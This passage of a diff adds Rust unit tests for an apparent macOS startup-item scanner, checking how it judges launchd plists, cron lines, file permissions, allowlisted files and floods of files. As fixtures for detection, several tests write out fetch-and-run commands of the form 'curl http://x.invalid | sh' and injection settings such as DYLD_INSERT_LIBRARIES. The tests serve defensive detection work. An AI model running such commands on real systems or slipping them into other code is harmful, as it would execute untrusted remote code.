+            ] {
+                fs::write(
+                    launch.join(format!("{name}.plist")),
+                    plist(
+                        name,
+                        "/bin/sh",
+                        &["-c", "curl http://x.invalid | sh"],
+                        &extra,
+                    ),
+                )
+                .unwrap();
+            }
+            let report = run_in(&dir, Limits::default());
+            for name in ["date", "data", "nan", "deep"] {
+                assert_eq!(item(&report, name).verdict, Verdict::Suspicious, "{name}");
+            }
+            assert_eq!(item(&report, "deeper").verdict, Verdict::WorthALook);
+            let _ = fs::remove_dir_all(&dir);
+        }
+
+        #[test]
+        fn settings_that_change_what_runs_are_called_out() {
+            let dir = scratch("settings");
+            let launch = dir.join("launch");
+            let env = |name: &str| {
+                format!("<key>EnvironmentVariables</key><dict><key>{name}</key><string>/x</string></dict>")
+            };
+            for (name, extra, want) in [
+                ("bashenv", env("BASH_ENV"), Verdict::WorthALook),
+                ("dyld", env("DYLD_INSERT_LIBRARIES"), Verdict::WorthALook),
+                ("lang", env("LANG"), Verdict::NothingFound),
+                (
+                    "stdin",
+                    "<key>StandardInPath</key><string>/x</string>".into(),
+                    Verdict::WorthALook,
+                ),
+                (
+                    "root",
+                    "<key>RootDirectory</key><string>/x</string>".into(),
+                    Verdict::WorthALook,
+                ),
+                (
+                    "inetd",
+                    "<key>inetdCompatibility</key><dict/>".into(),
+                    Verdict::WorthALook,
+                ),
+                (
+                    "odd",
+                    "<key>ProgramArguments</key><array><integer>1</integer></array>".into(),
+                    Verdict::WorthALook,
+                ),
+                (
+                    "keepoff",
+                    "<key>KeepAlive</key><false/>".into(),
+                    Verdict::NothingFound,
+                ),
+                (
+                    "keepon",
+                    "<key>KeepAlive</key><dict><key>SuccessfulExit</key><false/></dict>".into(),
+                    Verdict::NothingFound,
+                ),
+            ] {
+                fs::write(
+                    launch.join(format!("{name}.plist")),
+                    plist(name, "/bin/ls", &[], &extra),
+                )
+                .unwrap();
+                let report = run_in(&dir, Limits::default());
+                let got = item(&report, name);
+                assert_eq!(got.verdict, want, "{name}: {:?}", got.reasons);
+            }
+            let report = run_in(&dir, Limits::default());
+            assert_eq!(item(&report, "keepoff").enabled, None);
+            assert_eq!(item(&report, "keepon").enabled, Some(true));
+            let _ = fs::remove_dir_all(&dir);
+        }
+
+        #[test]
+        fn cron_lines_are_judged_as_the_shell_commands_they_are() {
+            let judged = |text: &str| -> Vec<StartupItem> {
+                super::super::launchd::cron_candidates(text)
+                    .into_iter()
+                    .map(|c| {
+                        judge(
+                            &AppConfig::for_base_dir(Path::new("/nonexistent/thenex")),
+                            &BinaryAiScanner::heuristic_only(),
+                            c,
+                        )
+                    })
+                    .collect()
+            };
+            for (line, want) in [
+                ("@reboot /bin/ls -l", Verdict::NothingFound),
+                (
+                    "* * * * * curl http://x.invalid/a | sh",
+                    Verdict::Suspicious,
+                ),
+                (
+                    "* * * * * /bin/ls; curl http://x.invalid/a|sh",
+                    Verdict::Suspicious,
+                ),
+                ("* * * * * cd /x && ./a", Verdict::WorthALook),
+                ("* * * * * /bin/ls $(x)", Verdict::WorthALook),
+                ("* * * * * /etc/profile", Verdict::NotChecked),
+            ] {
+                let items = judged(line);
+                assert_eq!(items[0].verdict, want, "{line}: {:?}", items[0].reasons);
+            }
+            for setting in ["SHELL=/tmp/x", "BASH_ENV=/x"] {
+                let items = judged(&format!("{setting}\n@daily /bin/ls\n"));
+                assert_eq!(items[0].verdict, Verdict::WorthALook, "{setting}");
+            }
+            assert_eq!(
+                judged("SHELL=/bin/zsh\n@daily /bin/ls\n")[0].verdict,
+                Verdict::NothingFound
+            );
+        }
+
+        #[test]
+        fn who_could_change_or_read_a_program_is_told_apart() {
+            let dir = scratch("perms");
+            let folder = dir.join("shared");
+            fs::create_dir(&folder).unwrap();
+            let program = folder.join("run");
+            fs::write(&program, "x").unwrap();
+            let text = program.to_str().unwrap();
+            let said =
+                |item: &StartupItem, what: &str| item.reasons.iter().any(|r| r.contains(what));
+            assert!(!said(&verdict_of("x", text, &[]), "Other users"));
+            fs::set_permissions(&folder, fs::Permissions::from_mode(0o777)).unwrap();
+            assert!(said(&verdict_of("x", text, &[]), "or a folder it is in"));
+            // No permission is not the same as gone (root, which can always look, is exempt).
+            fs::set_permissions(&folder, fs::Permissions::from_mode(0o000)).unwrap();
+            let hidden = verdict_of("x", text, &[]);
+            if fs::metadata(&program).is_err() {
+                assert_eq!((hidden.verdict, hidden.exists), (Verdict::NotChecked, None));
+                assert!(said(&hidden, "may not have permission"));
+            }
+            fs::set_permissions(&folder, fs::Permissions::from_mode(0o755)).unwrap();
+            // Something that runs as root from a file an ordinary account owns.
+            let daemon = |program: &str| {
+                judge(
+                    &AppConfig::for_base_dir(Path::new("/nonexistent/thenex")),
+                    &BinaryAiScanner::heuristic_only(),
+                    Candidate {
+                        program: Some(program.into()),
+                        as_root: true,
+                        ..Candidate::default()
+                    },
+                )
+            };
+            assert_eq!(daemon("/bin/ls").verdict, Verdict::NothingFound);
+            let owned = fs::metadata(&program).map(|m| std::os::unix::fs::MetadataExt::uid(&m));
+            if owned.unwrap() != 0 {
+                assert!(said(&daemon(text), "ordinary account owns"));
+            }
+            let _ = fs::remove_dir_all(&dir);
+        }
+
+        #[test]
+        fn an_always_allowed_file_counts_only_for_what_really_runs() {
+            let dir = scratch("allowed");
+            let cfg = AppConfig::for_base_dir(&dir.join("TheNex"));
+            cfg.ensure_dirs().unwrap();
+            let scanner = BinaryAiScanner::heuristic_only();
+            for (name, body, direct) in [
+                ("plain", "#!/bin/sh\necho 1\n", true),
+                ("env", "#!/usr/bin/env sh\necho 2\n", false),
+                ("other", "#!/nonexistent/evil\necho 3\n", false),
+            ] {
+                let file = fs::canonicalize(&dir).unwrap().join(name);
+                fs::write(&file, body).unwrap();
+                let mut f = Findings::default();
+                assert!(
+                    !look_at(&cfg, &scanner, &file, true, &mut f).allowed,
+                    "{name}"
+                );
+                let hash = crate::known_bad::hash_file(&file, u64::MAX).unwrap();
+                let entry = crate::allowlist::AllowedFile::new(
+                    &crate::quarantine::to_hex(&hash),
+                    name,
+                    "MANUAL",
+                )
+                .unwrap();
+                crate::allowlist::add(&cfg, entry).unwrap();
+                let looked = look_at(&cfg, &scanner, &file, true, &mut f);
+                assert!(looked.allowed && !looked.clean, "{name}");
+                assert_eq!(runs_itself(&scanner, &file), direct, "{name}");
+            }
+            let _ = fs::remove_dir_all(&dir);
+        }
+
+        #[test]
+        fn floods_of_files_are_bounded_and_said() {
+            let dir = scratch("flood");
+            let launch = dir.join("launch");
+            for n in 0..MAX_DIR_ENTRIES + 100 {
+                fs::write(launch.join(format!("junk{n}.txt")), b"").unwrap();
+            }
+            fs::write(
+                launch.join("z.plist"),
+                plist("com.example.z", "/bin/ls", &[], ""),
+            )
+            .unwrap();
+            let report = run_in(&dir, Limits::default());
+            assert!(
+                !report.truncated && report.items.len() == 1,
+                "other files do not count"
+            );
+            // More links to one big definition than there is time for.
+            let mut big = plist(
+                "com.example.big",
+                "/bin/ls",
+                &[],
+                "<key>k</key><string>@</string>",
+            );
+            big = big.replace('@', &"x".repeat(MAX_DEFINITION_BYTES as usize - 1000));
+            fs::write(dir.join("big"), big).unwrap();
+            for n in 0..MAX_ITEMS + 10 {
+                symlink(dir.join("big"), launch.join(format!("l{n}.plist"))).unwrap();
+            }
+            let started = Instant::now();
+            let limits = Limits {
+                total: Duration::from_secs(2),
+                ..Limits::default()
+            };
+            let report = run_in(&dir, limits);
+            assert!(
+                started.elapsed() < Duration::from_secs(12),
+                "{:?}",
+                started.elapsed()
+            );
+            assert!(report.truncated);
+            assert_eq!(report.items.len(), MAX_ITEMS);
+            assert!(report
+                .items
+                .iter()
+                .any(|i| i.reasons[0].contains("not enough time")));
+            let _ = fs::remove_dir_all(&dir);
+        }
+
+        #[test]
+        fn an_account_called_you_is_not_shown_as_you() {
+            let settings = [
+                ("Program".to_string(), Setting::Text("/bin/ls".into())),
+                ("UserName".to_string(), Setting::Text("you".into())),
+            ];
+            let c = super::super::launchd::candidate(
+                &settings,
+                Path::new("/x.plist"),
+                "launch_daemon",
+                false,
+            );
+            assert_eq!((c.runs_as.as_str(), c.as_root), ("account \"you\"", false));
+            let c = super::super::launchd::candidate(
+                &settings[..1],
+                Path::new("/x.plist"),
+                "launch_daemon",
+                false,
+            );
+            assert_eq!((c.runs_as.as_str(), c.as_root), ("system", true));
         }
 
         #[test]
